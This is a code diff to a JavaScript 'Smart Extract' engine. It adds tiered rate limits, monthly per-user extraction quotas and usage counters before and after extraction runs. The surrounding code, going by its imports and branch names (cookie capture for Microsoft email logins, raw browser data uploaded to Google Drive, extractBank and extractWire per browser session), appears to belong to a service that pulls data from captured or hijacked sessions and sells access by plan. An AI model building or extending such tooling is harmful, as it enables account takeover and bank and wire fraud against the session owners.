@@ -9,6 +9,9 @@ import { getPlatformConfig, getExtractor } from '../app/socials/social-extract/p
 import { createOrUpdateJsonFile, getJsonContentFromFile, uploadBrowserDataRaw } from '../app/api/googledrive.mjs';
 import { isFreeMicrosoftDomain, getCookieCaptureUrls } from '../app/emails/cookie/cookie-api-login/platformHelper/index.js';
 import { setCachedRow, immediateFlush } from './cookieCache.js';
+import { checkActionAllowed, checkUserQuota } from '../app/socials/_shared/limits.js';
+import { resolveAccountGate, accountGateError } from '../app/socials/_shared/accountGate.js';
+import { getAccountUsage, updateAccountUsage, updateUserUsage } from '../app/socials/_shared/hubUpdater.js';
 
 // ============================================================
 // SMART EXTRACT ENGINE
@@ -2926,6 +2929,29 @@ export async function runSmartExtract(browserId, category, username, platform) {
         await updateExtractStatus(browserId, 'started');
         const session = await resolveSession(browserId);
 
+        // Limits gating BEFORE any browser launch:
+        //  ACCOUNT tier — RATE_LIMITED/CANCELLED accounts never extract
+        //    (RATE_LIMITED auto-recovers when platform windows have rolled);
+        //  PLATFORM tier — per-platform 'extract' action column (0/missing = unlimited);
+        //  USER tier — monthly extractionUsage budget (plan-row quota).
+        const extractPlatform = String(platform || session.platform || session.domain || '').trim();
+        const gateUserId = session.userId || null;
+        if (extractPlatform) {
+            const statusGate = await resolveAccountGate(browserId, extractPlatform);
+            if (statusGate.blocked) throw accountGateError(browserId, statusGate);
+            const usageData = await getAccountUsage(browserId);
+            const extractCheck = await checkActionAllowed(extractPlatform, 'extract', (usageData && usageData.interactionUsage) || {});
+            if (!extractCheck.allowed) {
+                throw new Error(`Extraction limit reached (extract): ${extractCheck.reason}`);
+            }
+        }
+        if (gateUserId) {
+            const userQuota = await checkUserQuota(gateUserId, { keys: ["extractionUsage"] });
+            if (!userQuota.allowed) {
+                throw new Error(`Extraction blocked by user limits: ${userQuota.reason}`);
+            }
+        }
+
         let data;
         if (key === 'social') {
             await updateExtractStatus(browserId, 'extracting');
@@ -2935,6 +2961,15 @@ export async function runSmartExtract(browserId, category, username, platform) {
             data = await extractBank(session, platform, browserId);
         } else {
             data = await extractWire(session, browserId);
+        }
+
+        // Tier accounting: the run consumed a browser + platform resources
+        // regardless of whether the payload had meaningful content.
+        if (extractPlatform) {
+            try { await updateAccountUsage(browserId, 'extract'); } catch (e) { logger.warn(`[smartExtract] extract usage increment failed: ${e.message}`); }
+        }
+        if (gateUserId) {
+            try { await updateUserUsage(gateUserId, 'extractionUsage'); } catch (e) { logger.warn(`[smartExtract] user usage increment failed: ${e.message}`); }
         }
 
         // Guard: a run with NO meaningful content (dead session → sign-in
